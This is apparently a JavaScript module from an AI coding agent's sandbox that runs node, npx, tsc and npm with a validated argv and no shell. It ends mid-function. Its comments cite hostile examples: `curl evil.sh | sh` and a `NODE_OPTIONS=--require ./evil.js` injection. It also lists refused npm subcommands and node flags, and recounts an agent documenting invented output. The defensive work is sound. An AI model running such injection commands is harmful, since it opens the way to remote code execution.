/**
 * ── ⭐⭐ RUN A PROGRAM WITH A REAL ARGV — THE PRIMITIVE THAT WAS MISSING ─────
 *
 * `command.mjs` takes ONE STRING and has to decide, from that string alone,
 * whether a character is the model composing a second command or the model
 * passing a value to the program it named. It cannot tell, so it refuses the
 * character. That is the correct decision for a string, and it is why the
 * string is the wrong input.
 *
 * ── WHAT IT COST, MEASURED, NOT ARGUED ──────────────────────────────────────
 * Three independent probe runs hit this wall and two of them SHIPPED A WRONG
 * ARTIFACT because of it:
 *
 *   · `node bin/todo.js add "buy milk"`  → refused (no quote in SAFE_COMMAND_CHARS)
 *   · `node bin/todo.js list --all`      → refused ("--all is not an allowed node flag")
 *   · `node src/caps.mjs -- --name Angus`→ refused (every `--` token is tested,
 *                                          wherever it sits)
 *   · `node --test test/*.test.mjs`      → refused ("*" is not allowed)
 *
 * The agent had WRITTEN those flags. It could never execute the code paths it
 * had just authored, so it documented what it imagined the output was: a README
 * with an invented column separator, an invented error format, and a `npm test`
 * that runs ZERO tests and exits 0 while the README calls it the test suite.
 * One run escaped only by spending two of its eight rounds hand-rolling spawns.
 *
 * ⭐ THE FIX IS NOT A LOOSER WHITELIST. Widening `SAFE_COMMAND_CHARS` to admit a
 * quote would make the string ambiguous in exactly the way the whitelist exists
 * to prevent. The fix is to stop having a string: this module takes
 * `program` + `args[]` and hands them to `spawn` with `shell: false`. A quote, a
 * space, a `--anything`, a `;`, a `>` — all of them are DATA in an argv slot,
 * because there is no parser left to reinterpret them. There is still no shell,
 * and there is still no way to name a fifth binary.
 *
 * ── ⚠️ THE ARGV BOUNDARY, WHICH IS THE ONE IDEA IN HERE ─────────────────────
 * For `node`, the tokens before the first non-flag token are NODE'S flags and
 * are validated exactly as before — `--eval`, `--require`, `--env-file`,
 * `--inspect` and `--watch` stay closed for their existing reasons. The first
 * non-flag token is the SCRIPT PATH and must live in the workspace.
 *
 * Everything AFTER the script path is passed through untouched, and this is
 * deliberate rather than lax: node has already stopped reading by then. Those
 * tokens are handed to the script as `process.argv`; node never interprets them,
 * so re-applying node's flag rules to them refuses `--pri high` for a reason
 * that is not true. That mis-applied rule is the bug this module exists to kill.
 *
 * ── ⚠️ AND WHY THE FLAG LISTS ARE NOT COPIED INTO THIS FILE ─────────────────
 * The obvious implementation duplicates `NODE_FLAGS` and `REFUSED_NODE_FLAGS`
 * here (they are module-private in `command.mjs`). A second copy is a security
 * bug waiting for its first edit: someone closes a flag over there, this file
 * keeps allowing it, and the safer-looking module is the hole. So each
 * pre-boundary flag is checked by ASKING `command.mjs` about that one token —
 * `validateCommand` is pure, and the answer, including the refusal sentence, is
 * whatever `command.mjs` says today. One authority, no drift.
 *
 * ⚠️ That probe is the ONLY place a string is built, it is built from a fixed
 * template around a single already-character-checked flag, and it is never
 * spawned. This module has no `command` parameter and never splits one.
 * (`runPackageScript` splits one other string — a `package.json` script BODY —
 * and says so loudly at its own definition.)
 *
 * ── ⚠️ WHAT THIS DELIBERATELY DOES NOT DO ───────────────────────────────────
 * · No detached / background spawning. A long-running server is a different
 *   primitive with a different lifecycle problem, and bolting it on here would
 *   mean this function sometimes returns before the work happened.
 * · No process GROUP kill on timeout. Making a group requires `detached: true`,
 *   which is the previous bullet. So: the child is SIGKILLed, and a grandchild
 *   it spawned can outlive it. Stated rather than papered over.
 * · No env parameter. The child's environment is `scrubEnvironment(process.env)`
 *   and nothing else — a model that can name an environment variable can name
 *   `NODE_OPTIONS=--require ./evil.js`, which would reopen every flag refusal
 *   above from a direction nobody is looking at.
 */

import { existsSync, readFileSync, readdirSync, realpathSync } from 'node:fs';
import { join, relative, resolve, sep } from 'node:path';

import {
  ALLOWED_BINARIES,
  ALLOWED_NPX_PACKAGES,
  ALLOWED_SCRIPT_BINARIES,
  DEFAULT_COMMAND_TIMEOUT_MS,
  MAX_COMMAND_TIMEOUT_MS,
  ALLOW_INSTALL_ENV,
  INSTALL_MIN_TIMEOUT_MS,
  buildInvocation,
  childEnvironment,
  inspectNpmrcForInstall,
  inspectManifestForInstall,
  inspectLockfileForInstall,
  installEnabled,
  scrubEnvironment,
  spawnBounded,
  validateCommand,
  validateNpmInstallArgv,
} from './command.mjs';
import { globToRegExp } from './search.mjs';
import { resolveInWorkspace } from './workspace.mjs';

/** 64 arguments is a generous CLI invocation and an implausible accident. */
export const MAX_ARGS = 64;
/** A single argument longer than this is a file's contents, not an argument. */
export const MAX_ARG_CHARS = 512;
/** One glob may name this many files; more than this and the pattern is wrong. */
export const MAX_GLOB_MATCHES = 200;
/** After expansion. `**\/*.mjs` in a big repo must not become a 5,000-slot argv. */
export const MAX_TOTAL_ARGS = 256;
/** Bounds the walk itself, so a glob in a huge tree cannot take a minute. */
const MAX_WALK_FILES = 20_000;

/**
 * ⚠️ SAME FOUR DIRECTORIES `search.mjs` SKIPS, for the same reason: a glob that
 * matches inside `node_modules` is never what was meant, and expanding one into
 * argv would hand a test runner ten thousand other people's files.
 */
const GLOB_SKIP_DIRS = new Set(['node_modules', '.git', 'dist', 'build']);

/**
 * ⚠️ REFUSED BY NAME, WITH THE REASON, because "not an allowed subcommand" reads
 * like an omission and these are decisions. Every one of them fetches code from
 * a registry and runs its lifecycle scripts, which is arbitrary remote code
 * arriving through a command that looks like housekeeping.
 *
 * ⚠️ `install` / `ci` / `i` / `add` ARE STILL IN THIS SET AND STILL REFUSED BY
 * DEFAULT. They are lifted out one layer up (`npmInstallPlan`) only when the
 * OPERATOR has set `ACUVO_ALLOW_INSTALL=1` — a variable the agent has no verb
 * that reaches. Leaving them here rather than deleting them is deliberate: the
 * default surface's refusal, and its wording, is unchanged.
 */
const REFUSED_NPM_SUBCOMMANDS = new Set([
  'install', 'ci', 'i', 'add', 'exec', 'x', 'publish', 'link', 'update', 'audit',
]);

/**
 * ── ⭐ INSTALL IS AN **ARGV** OPERATION, AND THIS IS THE PRIMARY DOOR ────────
 *
 * `run_command` can express `npm install zod`, but the string tokenizer's
 * character whitelist has no `^` in it, so `zod@^4` is unreachable there and
 * always will be — widening that class for a range operator would be paying a
 * global price for one command. Here there is no string and no parser: `["install",
 * "zod@^4.1.0"]` is two argv slots and the spec is checked as DATA.
 *
 * ⚠️ THE DECISION IS NOT RE-IMPLEMENTED HERE. `command.mjs` owns what an install
 * spec may be, which flags are allowed, and the fact that `--ignore-scripts` is
 * forced at spawn time. This function assembles a token list and asks. A second
 * copy of that policy is the exact shape `command.mjs`'s own header names as the
 * bug — "the safer-looking module is the hole" — and this package has already
 * shipped one RCE that printed a check mark.
 *
 * ⚠️ AND IT IS NOT AVAILABLE TO `start_process`. An install in the background is
 * a process nobody waits for, whose receipt nobody reads, racing the very
 * `node`/`npm test` run that needs the dependency it is fetching. See
 * `planSingleSpawn`.
 *
 * @param {string[]} args the raw argv the model supplied
 * @param {NodeJS.ProcessEnv} env
 */
function npmInstallPlan(args, env) {
  return validateNpmInstallArgv(args, { allowInstall: installEnabled(env) });
}

/** The four npm subcommands that fetch. Kept in step with `command.mjs` by the
 *  test `npm-install.test.mjs`, which asserts each one reaches the same gate. */
const INSTALL_SUBCOMMANDS = new Set(['install', 'i', 'add', 'ci']);

/**
 * ── ⭐ THE ONE PLACE npm IS REALLY SPAWNED ──────────────────────────────────
 *
 * Everywhere else in this module npm is *planned* and its script body is run
 * directly, because npm hands script bodies to a shell. An install has no script
 * body — it is npm's own resolver doing npm's own job — so here npm really does
 * run, through its `npm-cli.js` entry point (never a `.cmd` shim; see
 * `buildInvocation`) with `shell: false` and a scrubbed environment.
 *
 * ⚠️ THE `.npmrc` AND `package.json` PRE-FLIGHT IS THE SAME PURE CHECK
 * `executeRunCommand` runs, imported rather than re-written. Both files are
 * inside the workspace and therefore agent-writable, and a workspace `.npmrc`
 * that redirects `registry=` would make every other check here decorative.
 */
async function runNpmInstall({ root, args, timeoutMs, spawnImpl, env }) {
  const plan = npmInstallPlan(args, env);
  if (!plan.ok) return plan;

  const pkgPath = resolveInWorkspace(root, 'package.json', 'read');
  if (!pkgPath.ok || !existsSync(pkgPath.absolute)) {
    return { ok: false, error: `npm ${plan.npmInstall.sub} needs a package.json in this workspace — an install into a directory with no manifest records the dependency nowhere. Write one first.` };
  }
  /**
   * ⚠️ THE SAME TWO FILES AS `command.mjs`, CHECKED HERE TOO. `run_program`
   * reaches npm through this path and not through that one, so a check written
   * in only one of them holds for only one of the two tools — which is how the
   * `--no-run` gap got in, one file over.
   */
  let manifestText = '';
  try {
    manifestText = readFileSync(pkgPath.absolute, 'utf8');
  } catch (err) {
    return { ok: false, error: `package.json could not be read, so this install cannot be checked: ${err instanceof Error ? err.message : String(err)}` };
  }
  const manifest = inspectManifestForInstall(manifestText);
  if (!manifest.ok) return manifest;
  const lockPath = resolveInWorkspace(root, 'package-lock.json', 'read');
  if (lockPath.ok && existsSync(lockPath.absolute)) {
    let lockText = '';
    try {
      lockText = readFileSync(lockPath.absolute, 'utf8');
    } catch (err) {
      return { ok: false, error: `package-lock.json exists but could not be read, so this install cannot be checked: ${err instanceof Error ? err.message : String(err)}` };
    }
    const lock = inspectLockfileForInstall(lockText);
    if (!lock.ok) return lock;
  }
  const rcPath = resolveInWorkspace(root, '.npmrc', 'read');
  if (rcPath.ok && existsSync(rcPath.absolute)) {
    let rcText = '';
    try {
      rcText = readFileSync(rcPath.absolute, 'utf8');
    } catch (err) {
      return { ok: false, error: `.npmrc exists but could not be read, so this install cannot be checked: ${err instanceof Error ? err.message : String(err)}` };
    }
    const rc = inspectNpmrcForInstall(rcText);
    if (!rc.ok) return rc;
  }

  const inv = buildInvocation({ binary: 'npm', tokens: plan.tokens }, root);
  if (!inv.ok) return { ok: false, error: inv.error };

  /**
   * ⚠️ A FLOOR, NOT THE CALLER'S NUMBER — the one deviation in this package from
   * "honour the timeout exactly", argued in full at `INSTALL_MIN_TIMEOUT_MS`.
   * The dispatcher hands every `run_program` call the 120s default, and a cold
   * install of a real dependency tree exceeds it routinely; a killed install
   * leaves a half-populated `node_modules` that the next command reads as
   * success.
   */
  const requested = typeof timeoutMs === 'number' && Number.isFinite(timeoutMs) ? timeoutMs : 0;
  const bounded = boundTimeout(Math.max(requested, INSTALL_MIN_TIMEOUT_MS));
  const run = await spawnPlanned({ file: inv.file, spawnArgs: inv.args, cwd: root, timeoutMs: bounded, spawnImpl });
  if (!run.ok) return run;

  return {
    ok: true,
    program: 'npm',
    argv: plan.tokens,
    /** ⭐ The receipt that proves `--ignore-scripts` was really there: this is
     *  the argv that hit the OS, forced flag included. */
    spawnArgv: [inv.file, ...inv.args],
    installed: run.exitCode === 0 && !run.timedOut
      ? readInstalledRangesFrom(pkgPath.absolute, plan.npmInstall.packages)
      : null,
    exitCode: run.exitCode,
    signal: run.signal,
    timedOut: run.timedOut,
    stdout: run.stdout,
    stderr: run.stderr,
    truncated: run.truncated,
    durationMs: run.durationMs,
    passed: run.exitCode === 0 && !run.timedOut,
  };
}

/**
 * ⚠️ A REQUESTED PACKAGE MISSING FROM package.json AFTERWARDS IS REPORTED AS
 * `null`, NOT OMITTED. npm exits 0 on plenty of partial outcomes and a receipt
 * that quietly drops the line it could not confirm is the "green run, nothing
 * happened" failure this package keeps finding in itself.
 */
function readInstalledRangesFrom(absPackageJson, packages) {
  const blank = packages.map((p) => ({ name: p.name, range: null, section: null }));
  let pkg;
  try {
    pkg = JSON.parse(readFileSync(absPackageJson, 'utf8'));
  } catch {
    return blank;
  }
  const sections = ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies'];
  return packages.map((p) => {
    for (const section of sections) {
      const block = pkg?.[section];
      if (block && typeof block === 'object' && typeof block[p.name] === 'string') {
        return { name: p.name, range: block[p.name], section };
      }
    }
    return { name: p.name, range: null, section: null };
  });
}

/**
 * The character set a PRE-BOUNDARY flag may use. Not a safety boundary on its
 * own — it exists so the one-token probe below is always well formed, and so a
 * flag containing a space gets a sentence about flags instead of a sentence
 * about shells.
 */
const FLAG_TOKEN = /^[A-Za-z0-9._\-/=:]+$/;

const isGlob = (s) => typeof s === 'string' && /[*?]/.test(s);
const isFlag = (s) => typeof s === 'string' && s.startsWith('-') && s !== '-';

/**
 * @typedef {{ ok: false, error: string }} ArgvRefused
 * @typedef {{ ok: true, args: string[] }} ArgsAccepted
 */

/**
 * Shape and size of the argument array. Nothing here is about safety from a
 * shell — there is no shell. It is about a model that hands us a 40MB string or
 * an object where an array belongs.
 *
 * ⚠️ Newline and carriage return are refused even though argv carries them
 * fine. They break every transcript, every log line and every human reading
 * "what really ran", and an argument that needs one wants a file.
 *
 * @returns {ArgsAccepted | ArgvRefused}
 */
export function checkArgList(args) {
  if (args === undefined || args === null) return { ok: true, args: [] };
  if (!Array.isArray(args)) {
    return { ok: false, error: 'args must be an ARRAY of strings, one argument per slot — that is the whole point of this tool. ["add", "buy milk"] is two arguments; "add buy milk" is not.' };
  }
  if (args.length > MAX_ARGS) {
    return { ok: false, error: `${args.length} arguments, over the ${MAX_ARGS} limit` };
  }
  for (let i = 0; i < args.length; i += 1) {
    const a = args[i];
    if (typeof a !== 'string') return { ok: false, error: `args[${i}] is ${typeof a}, not a string — numbers and booleans must be written as strings` };
    if (a.length > MAX_ARG_CHARS) return { ok: false, error: `args[${i}] is ${a.length} characters, over the ${MAX_ARG_CHARS} limit — write it to a file and pass the path` };
    if (a.includes('\u0000')) return { ok: false, error: `args[${i}] contains a NUL byte, which truncates the argument in some syscalls` };
    if (/[\r\n]/.test(a)) return { ok: false, error: `args[${i}] contains a newline — write multi-line input to a file and pass the path instead` };
  }
  return { ok: true, args: args.slice() };
}

/** Depth-first, sorted, bounded, and never inside the four skipped directories. */
function* walkWorkspace(dir, budget) {
  let entries;
  try {
    entries = readdirSync(dir, { withFileTypes: true });
  } catch {
    return; // an unreadable directory is skipped, never fatal
  }
  entries.sort((a, b) => a.name.localeCompare(b.name));
  for (const e of entries) {
    if (budget.seen >= MAX_WALK_FILES) return;
    const abs = join(dir, e.name);
    if (e.isDirectory()) {
      if (GLOB_SKIP_DIRS.has(e.name)) continue;
      yield* walkWorkspace(abs, budget);
    } else if (e.isFile()) {
      budget.seen += 1;
      yield abs;
    }
  }
}

/**
 * ── ⭐ THE VACUOUS-GREEN FIX ────────────────────────────────────────────────
 *
 * `node --test test/*.test.mjs` is the single most common test invocation in
 * modern Node, and a shell is what normally turns the `*` into filenames. There
 * is no shell here, so either WE expand it or the pattern reaches node as a
 * literal filename that does not exist.
 *
 * ⚠️ AND A ZERO-MATCH GLOB IS AN ERROR, NEVER A PASSTHROUGH. This is the whole
 * reason the function exists rather than being three lines inline. Observed:
 * a project shipped with `"test": "node --test test/*.test.mjs"`, no `test/`
 * directory, and `npm test` EXITED 0 having run nothing — while its README
 * documented that command as the way to run the suite. A green light for an
 * empty suite is worse than a red one, because nobody looks again.
 *
 * Matching is SHELL semantics against the workspace-relative path: `*` does not
 * cross `/`, `**` does. It is not "find a file with this name anywhere" —
 * `find_files` is that tool, and conflating them would make `*.mjs` quietly
 * match a hundred files in `src/`.
 *
 * @param {string} root
 * @param {string[]} args
 * @returns {{ ok: true, args: string[], expanded: {pattern: string, count: number}[] } | ArgvRefused}
 */
export function expandArgGlobs(root, args) {
  const list = Array.isArray(args) ? args : [];
  if (!list.some(isGlob)) return { ok: true, args: list.slice(), expanded: [] };

  let realRoot;
  try {
    realRoot = realpathSync(resolve(root));
  } catch {
    return { ok: false, error: `workspace directory does not exist: ${root}` };
  }

  // Walked ONCE and reused by every pattern — three globs in one argv is normal
  // and three tree walks is not.
  const files = [];
  for (const abs of walkWorkspace(realRoot, { seen: 0 })) {
    const rel = relative(realRoot, abs).split(sep).join('/');
    // eslint-disable-next-line no-control-regex
    if (/[\u0000-\u001f]/.test(rel)) continue; // a filename that would corrupt the transcript
    files.push(rel);
  }
  files.sort();

  const out = [];
  const expanded = [];
  for (const arg of list) {
    if (!isGlob(arg)) { out.push(arg); continue; }
    let rx;
    try {
      rx = globToRegExp(arg);
    } catch {
      return { ok: false, error: `"${arg}" is not a usable glob — only *, ** and ? are supported` };
    }
    const hits = files.filter((f) => rx.test(f));
    if (hits.length === 0) {
      return {
        ok: false,
        error: `${arg} matched no files — running it would exit 0 having tested nothing. Call list_dir or find_files to see what is actually there, then pass a pattern that matches or name the paths literally.`,
      };
    }
    if (hits.length > MAX_GLOB_MATCHES) {
      return { ok: false, error: `${arg} matched ${hits.length} files, over the ${MAX_GLOB_MATCHES} limit — narrow the pattern to one directory` };
    }
    out.push(...hits);
    expanded.push({ pattern: arg, count: hits.length });
  }
  if (out.length > MAX_TOTAL_ARGS) {
    return { ok: false, error: `after glob expansion there would be ${out.length} arguments, over the ${MAX_TOTAL_ARGS} limit — narrow the pattern` };
  }
  return { ok: true, args: out, expanded };
}

/**
 * Ask `command.mjs` about ONE token, in the context of one binary. The probe
 * string is a fixed template; the token has already been character-checked, and
 * the operand is a constant that always passes. So any refusal that comes back
 * is about the token, and it is worded by the module that owns the rule.
 */
function probeToken(prefix, token, what) {
  if (!FLAG_TOKEN.test(token)) {
    return {
      ok: false,
      error: `"${token}" cannot be a ${what}: only letters, digits and . _ - / = : are usable there. If this is meant as data for your program, put it AFTER the script path, where arguments are passed through untouched.`,
    };
  }
  const verdict = validateCommand(`${prefix} ${token}`);
  if (!verdict.ok) return { ok: false, error: verdict.error };
  return { ok: true };
}

/** A non-flag token that must name something real inside the workspace. */
function checkWorkspaceTarget(root, token, role) {
  const r = resolveInWorkspace(root, token, 'read');
  if (!r.ok) return { ok: false, error: `${role} "${token}" is refused: ${r.reason}` };
  if (!existsSync(r.absolute)) {
    return { ok: false, error: `${role} "${r.relative}" does not exist, so nothing was run. Call list_dir or find_files to get the real path.` };
  }
  return { ok: true, path: r.relative };
}

/**
 * ── THE NODE ARGV WALK ──────────────────────────────────────────────────────
 *
 * Three states, and the transition between the first two is the whole module:
 *
 *   OPTIONS   every token is a node flag, validated by command.mjs.
 *   TARGETS   the first non-flag token was a GLOB, so this is
 *             `node --test <patterns>`: there is no script yet, so the tokens
 *             are still node's and are still checked.
 *   DATA      the first non-flag token was a real path — the script. From here
 *             node has stopped reading, so nothing is validated and nothing is
 *             glob-expanded. `"buy milk"`, `--all`, `--pri`, `--`, `>` and `*`
 *             all arrive at the script exactly as written.
 *
 * ⚠️ POST-BOUNDARY ARGUMENTS ARE NOT GLOB-EXPANDED, and that is a decision, not
 * an omission. A shell expanding `"*"` behind a program's back is a classic
 * data-corruption bug; doing it here would mean a script could never receive a
 * literal asterisk. Expansion belongs where node itself would have wanted
 * filenames — the target position.
 */
function buildNodeArgv(root, args) {
  if (args.length === 0) {
    return { ok: false, error: 'node with no arguments starts a REPL that never exits. Name a script: args: ["src/index.mjs"].' };
  }
  const out = [];
  let state = 'OPTIONS';
  let nextIsScript = false;

  for (let i = 0; i < args.length; i += 1) {
    const token = args[i];

    if (state === 'DATA') { out.push(token); continue; }

    if (nextIsScript) {
      // `node -- script.mjs` — the token after `--` is the script whatever it
      // looks like, which is exactly what `--` is for.
      const t = checkWorkspaceTarget(root, token, 'script');
      if (!t.ok) return t;
      out.push(t.path);
      state = 'DATA';
      nextIsScript = false;
      continue;
    }

    if (token === '--' && state === 'OPTIONS') {
      out.push(token);
      nextIsScript = true;
      continue;
    }

    if (isFlag(token)) {
      const probe = probeToken('node', token, 'node flag');
      if (!probe.ok) return probe;
      out.push(token);
      continue;
    }

    if (isGlob(token)) {
      const g = expandArgGlobs(root, [token]);
      if (!g.ok) return g;
      out.push(...g.args);
      state = 'TARGETS';
      continue;
    }

    const t = checkWorkspaceTarget(root, token, state === 'TARGETS' ? 'test target' : 'script');
    if (!t.ok) return t;
    out.push(t.path);
    // ⭐ THE BOUNDARY. Only a literal script path crosses it — in TARGETS mode
    // we are already past the point where a script could appear.
    if (state === 'OPTIONS') state = 'DATA';
  }

  if (out.length > MAX_TOTAL_ARGS) {
    return { ok: false, error: `after glob expansion there would be ${out.length} arguments, over the ${MAX_TOTAL_ARGS} limit` };
  }
  return { ok: true, args: out };
}

/**
 * tsc and npx have no data half — every token belongs to the compiler or to the
 * runner, so every token is expanded and then checked by `command.mjs`.
 * Expansion comes FIRST because a raw `*` would fail the character check that
 * the probe needs in order to be well formed.
 */
function buildCheckedArgv(root, prefix, args, what) {
  const g = expandArgGlobs(root, args);
  if (!g.ok) return g;
  for (const token of g.args) {
    const probe = probeToken(prefix, token, what);
    if (!probe.ok) return probe;
  }
  return { ok: true, args: g.args };
}

function buildNpxArgv(root, args) {
  const pkg = args[0];
  if (!ALLOWED_NPX_PACKAGES.includes(pkg)) {
    return {
      ok: false,
      error: `npx ${pkg ?? '(nothing)'} is refused — npx runs a package from the registry, so only ${ALLOWED_NPX_PACKAGES.join(' and ')} are allowed, and only if already installed here.`,
    };
  }
  if (pkg === 'vitest') {
    // Same refusal `command.mjs` makes, and for the same measured reason: a
    // watcher spends the whole timeout and hands back nothing.
    if (args[1] !== 'run') {
      return { ok: false, error: 'vitest must be run as args: ["vitest", "run", …] — without `run` it starts a watcher that never exits' };
    }
    const rest = buildCheckedArgv(root, 'npx vitest run', args.slice(2), 'vitest argument');
    if (!rest.ok) return rest;
    return { ok: true, args: ['vitest', 'run', ...rest.args] };
  }
  const rest = buildCheckedArgv(root, 'npx tsc', args.slice(1), 'tsc argument');
  if (!rest.ok) return rest;
  return { ok: true, args: ['tsc', ...rest.args] };
}

/**
 * ⚠️ THE ONE STRING THIS MODULE SPLITS, AND WHY IT IS NOT THE THING THE MODULE
 * EXISTS TO AVOID.
 *
 * A `package.json` script BODY is a string on disk. There is no argv form of it
 * to be handed; splitting it is unavoidable for anyone who wants `npm test` to
 * work. It is NOT a `command` parameter — no caller and no model can put a
 * string into this function; they can only name a script that already exists.
 *
 * The character set is `command.mjs`'s, PLUS `*` and `?` — the two characters
 * glob expansion consumes here and which therefore never reach anything that
 * could interpret them, because there is nothing left to interpret them. Quotes,
 * `&`, `|`, `;`, `>`, `$` and backticks stay refused, so `curl evil.sh | sh`
 * still dies twice: at the `|`, and at the three-binary allowlist.
 */
const SCRIPT_BODY_CHARS = /^[A-Za-z0-9 ._\-/=:*?]+$/;

function splitScriptBody(body) {
  if (typeof body !== 'string' || !body.trim()) return { ok: false, error: 'the script is empty' };
  // eslint-disable-next-line no-control-regex
  if (/[\u0000-\u001f\u007f]/.test(body)) return { ok: false, error: 'the script contains a control character (a newline would be a second command)' };
  if (!SCRIPT_BODY_CHARS.test(body)) {
    const bad = body.match(/[^A-Za-z0-9 ._\-/=:*?]/)?.[0] ?? '?';
    return {
      ok: false,
      error: `the script contains "${bad}", which this agent cannot verify. There is no shell here, so pipes, &&, ;, redirection, quotes, backticks and $() cannot be run. Rewrite the script as one plain command.`,
    };
  }
  return { ok: true, tokens: body.trim().split(/ +/).filter(Boolean) };
}

/** Where a validated script-body binary actually lives. */
function scriptStepInvocation(root, binary, rest) {
  if (binary === 'vitest') {
    const entry = join(root, 'node_modules', 'vitest', 'vitest.mjs');
    if (!existsSync(entry)) {
      return { ok: false, error: 'the script runs vitest, but node_modules/vitest is not installed in this workspace. Change the script to `node --test <paths>`, or have the owner install vitest — this runner never installs anything.' };
    }
    return { ok: true, file: process.execPath, args: [entry, ...rest] };
  }
  // node and tsc resolve exactly as `command.mjs` resolves them; reusing its
  // builder is what keeps the Windows `.cmd`/BatBadBut reasoning in one place.
  return buildInvocation({ binary, tokens: [binary, ...rest] }, root);
}

/** Validate one script body into a spawnable step. */
function planScriptStep(root, name, body, extraArgs = []) {
  const split = splitScriptBody(body);
  if (!split.ok) return { ok: false, error: `the "${name}" script is ${JSON.stringify(body)}, which is not allowed: ${split.error}` };
  const [binary, ...rest] = split.tokens;
  if (!ALLOWED_SCRIPT_BINARIES.includes(binary)) {
    return {
      ok: false,
      error: `the "${name}" script runs "${binary}", which this agent cannot verify. An npm script may only run: ${ALLOWED_SCRIPT_BINARIES.join(', ')}.`,
    };
  }
  let planned;
  if (binary === 'node') planned = buildNodeArgv(root, rest);
  else if (binary === 'vitest') {
    if (rest[0] !== 'run') return { ok: false, error: `the "${name}" script runs vitest without \`run\`, which starts a watcher that never exits` };
    const checked = buildCheckedArgv(root, 'npx vitest run', rest.slice(1), 'vitest argument');
    planned = checked.ok ? { ok: true, args: ['run', ...checked.args] } : checked;
  } else planned = buildCheckedArgv(root, 'tsc', rest, 'tsc argument');
  if (!planned.ok) return { ok: false, error: `the "${name}" script is ${JSON.stringify(body)}, which is not allowed: ${planned.error}` };

  const finalArgs = [...planned.args, ...extraArgs];
  const inv = scriptStepInvocation(root, binary, finalArgs);
  if (!inv.ok) return inv;
  return { ok: true, name, binary, argv: [binary, ...finalArgs], file: inv.file, spawnArgs: inv.args };
}

function readPackageJson(root) {
  const r = resolveInWorkspace(root, 'package.json', 'read');
  if (!r.ok) return { ok: false, error: `package.json is unreadable here: ${r.reason}` };
  if (!existsSync(r.absolute)) return { ok: false, error: 'this workspace has no package.json, so there are no npm scripts to run. Run the file directly: program "node", args ["path/to/file.mjs"].' };
  let text;
  try {
    text = readFileSync(r.absolute, 'utf8');
  } catch (err) {
    return { ok: false, error: `package.json could not be read: ${err instanceof Error ? err.message : String(err)}` };
  }
  let pkg;
  try {
    pkg = JSON.parse(text);
  } catch (err) {
    return { ok: false, error: `package.json is not valid JSON: ${err instanceof Error ? err.message : String(err)}` };
  }
  return { ok: true, pkg };
}

/**
 * ⚠️ THE FLOOR IS 50ms, NOT `command.mjs`'s 1,000ms, AND THE DIFFERENCE IS
 * DELIBERATE. Clamping a requested 100ms up to a second means the result says
 * `timedOut: false` for a run that was never given the timeout it asked for —
 * the tool quietly answered a different question. A short timeout is a legitimate
 * "is this thing hung?" probe, so it is honoured; 50ms is only there because
 * below it every spawn on Windows times out on process creation alone, which
 * would be a refusal dressed as a result.
 */
export const MIN_TIMEOUT_MS = 50;

function boundTimeout(timeoutMs) {
  const n = typeof timeoutMs === 'number' && Number.isFinite(timeoutMs) ? timeoutMs : DEFAULT_COMMAND_TIMEOUT_MS;
  return Math.min(Math.max(MIN_TIMEOUT_MS, n), MAX_COMMAND_TIMEOUT_MS);
}

function realRootOf(root) {
  try {
    return { ok: true, root: realpathSync(resolve(root)) };
  } catch {
    return { ok: false, error: `workspace directory does not exist: ${root}` };
  }
}

/**
 * Run one already-planned invocation. `spawnBounded` owns the timeout, the
 * SIGKILL, the output cap and the scrubbed environment — this module adds no
 * options of its own, which is how `shell: true` stays unreachable.
 */
async function spawnPlanned({ file, spawnArgs, cwd, timeoutMs, spawnImpl }) {
  // ⚠️ Passed explicitly rather than relying on spawnBounded's default, so a
  // future edit to that default cannot silently hand this child a real key.
  /**
   * ⚠️ `childEnvironment`, NOT `scrubEnvironment` — it also switches npm
   * lifecycle scripts off for a child that is not npm itself. This module is
   * the `node <a file the model wrote>` road, and that is exactly where an
   * install was reaching npm with scripts ENABLED while the gated road had them
   * off. See the paragraph on `childEnvironment` for what this does and does
   * not close, and for the pre/post-hook cost it deliberately accepts.
   */
  const env = childEnvironment({ file, args: spawnArgs }, process.env);
  /**
   * ⚠️⚠️ TWO VARIABLES `scrubEnvironment` DOES NOT KNOW ABOUT, BOTH FOUND BY
   * RUNNING THIS RATHER THAN BY READING IT.
   *
   * · `NODE_OPTIONS` is the flag allowlist's back door. Every refusal above —
   *   `--require`, `--import`, `--loader`, `--inspect` — is bypassed if the
   *   PARENT's environment already contains it, because node reads NODE_OPTIONS
   *   before it reads argv. Nothing in the scrub matches the name (it has no
   *   KEY/TOKEN/SECRET in it), so it would have been inherited straight past
   *   the door this module spends fifty lines guarding.
   * · `NODE_TEST_CONTEXT` is set inside `node --test`, and a child that sees it
   *   believes it is a test WORKER: it stops printing TAP and starts writing a
   *   serialised stream to a parent that is not listening. Observed here — the
   *   nested `node --test` returned exit 0 and an EMPTY stdout, which is the
   *   silent-green failure this whole module exists to prevent, arriving by a
   *   completely different route.
   *
   * Deleted here rather than in `scrubEnvironment` because that function is
   * shared with `run_command` and this module must not change its behaviour.
   */
  delete env.NODE_OPTIONS;
  delete env.NODE_TEST_CONTEXT;
  return spawnBounded({ file, args: spawnArgs, cwd, timeoutMs, spawnImpl, env });
}

/**
 * ── ⭐ PLANNING, SEPARATED FROM RUNNING ─────────────────────────────────────
 *
 * node · npx · tsc: validate the argv and resolve the EXACT `spawn(file, args)`,
 * without spawning anything. Extracted from `runProgram` rather than written
 * beside it, because `background.mjs` needs this half and only this half — it
 * starts a process that must OUTLIVE the call, so it cannot use `spawnPlanned`,
 * which owns the timeout that kills one.
 *
 * ⚠️ THE POINT IS THAT THERE IS NO SECOND COPY. A background start that
 * re-derived "is this a legal node flag" would be a second, less-audited door to
 * the same capability — the exact shape `command.mjs` names as the bug in its own
 * header, and this package has already shipped one RCE that printed a check mark.
 * Every refusal a background process gets is therefore, byte for byte, the
 * refusal `run_program` would have given.
 */
function planBinaryInvocation(cwd, program, args) {
  let planned;
  if (program === 'node') planned = buildNodeArgv(cwd, args);
  else if (program === 'npx') planned = buildNpxArgv(cwd, args);
  else planned = buildCheckedArgv(cwd, 'tsc', args, 'tsc argument');
  if (!planned.ok) return planned;

  const inv = buildInvocation({ binary: program, tokens: [program, ...planned.args] }, cwd);
  if (!inv.ok) return { ok: false, error: inv.error };
  return { ok: true, argv: [program, ...planned.args], file: inv.file, spawnArgs: inv.args };
}

/**
 * `npm test` / `npm run <script>` / `npm run <script> -- <args…>`, as ONE
 * planned spawn.
 *
 * ⚠️ SHARED WITH `runNpm` SO THE TWO CANNOT DISAGREE ABOUT WHAT `--` MEANS.
 *
 * @returns {{ ok: true, script: string, extra: string[] } | ArgvRefused}
 */
function parseNpmArgs(args) {
  const sub = args[0];
  /**
